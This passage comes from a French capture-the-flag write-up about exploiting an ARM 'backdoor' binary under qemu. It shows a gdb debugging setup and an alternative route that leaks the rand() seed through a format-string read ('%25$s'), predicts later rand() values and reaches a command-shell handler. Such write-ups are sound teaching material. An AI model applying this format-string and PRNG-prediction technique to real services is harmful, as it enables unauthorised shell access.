L'inconvénient est que le programme termine après un seul client. L'avantage est
qu'on peut suivre (et debugger) le déroulement du pwn...

On peut lancer `qemu-arm -g  9998 -L rootfs/ rootfs/phone/bin/backdoor` dans une
console, utiliser  .gdbinit pour définir  nos paramètres  ("target remote 9998",
"set sysrootfs ...", breakpoints, ...), et lancer notre script de pwn.


## [ Chemin alternatif ] ---------------------------------------------- [ 8 ] ##

Le chemin initialement proposé par le challenge était de se baser sur rand. J'ai
d'abord cru que ce chemin était  plus compliqué parce qu'il fallait prédire rand
sur une architecture CPU différente, mais ce chemin est en fait plus simple !

Une première clef est  que srand est exécuté au début  du programme, et conserve
sa valeur au travers des fork. Chaque nouveau client a donc la même seed et aura
les mêmes valeurs retournées par les appels à rand().

Un autre particularité de rand est que l'algorithme est stable depuis un certain
nombre  d'années  et  son  implémentation  sur  différentes  architecture  donne
également les mêmes résultats (c'est du  C après tout, c'est assez logique). Par
exemple, après  un srand(0), rand() donne  1804289383 à travers qemu-arm  et sur
mon hôte x64 qui  a une libc 10 ou 15 ans plus  récentes. On peut donc récupérer
l'état en mémoire après srand via snprintf et prédire sur notre machine les rand
suivants.

Il  faudra utiliser  un  outil  légèrement différent  :  "%25$s" déréférence  le
pointeur qu'on met  après la commande echo  et lit comme si  il s'agissait d'une
chaîne de texte (jusqu'au prochain \0). Il faudra également trouver l'adresse de
chargement de la libc pour pouvoir pointer  vers la zone mémoire qui contient la
seed. On peut ensuite soit utiliser un code C pour obtenir les valeurs de rand()
à prédire, soit directement appeler la libc en python via ctypes.

Après  cet appel,  on  se retrouve  dans do_cmd_shell(socket)  sans  avoir eu  à
utiliser l'outil d'écriture !
